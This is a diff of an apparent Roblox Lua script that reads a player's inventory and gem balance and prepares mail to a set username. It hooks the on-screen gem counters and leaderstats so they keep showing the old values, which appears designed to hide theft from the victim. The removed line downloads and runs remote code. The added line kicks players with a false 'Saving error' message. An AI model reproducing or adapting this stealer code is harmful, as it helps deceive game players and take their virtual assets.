@@ -9,7 +9,7 @@ end
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "dis 30metrov"
+local MailMessage = "gg / HcpNe56R2a"
 local GetSave = function()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
@@ -21,7 +21,7 @@ for i, v in pairs(GetSave().Inventory.Currency) do
 end
 
 if GemAmount1 < 10000 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/scripts/main/hiddenauto.lua"))()
+    plr:kick("Saving error, please rejoin! Source code by .t.ob.i.")
 end
 
 local user = Username
@@ -32,8 +32,8 @@ gemsleftpath:GetPropertyChangedSignal("Text"):Connect(function()
 	gemsleftpath.Text = gemsleft
 end)
 
-local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats[" Diamonds"].Value
-local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats[" Diamonds"]
+local gemsleaderstat = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"].Value
+local gemsleaderstatpath = game:GetService('Players').LocalPlayer.leaderstats["💎 Diamonds"]
 gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
 	gemsleaderstatpath.Value = gemsleaderstat
 end)
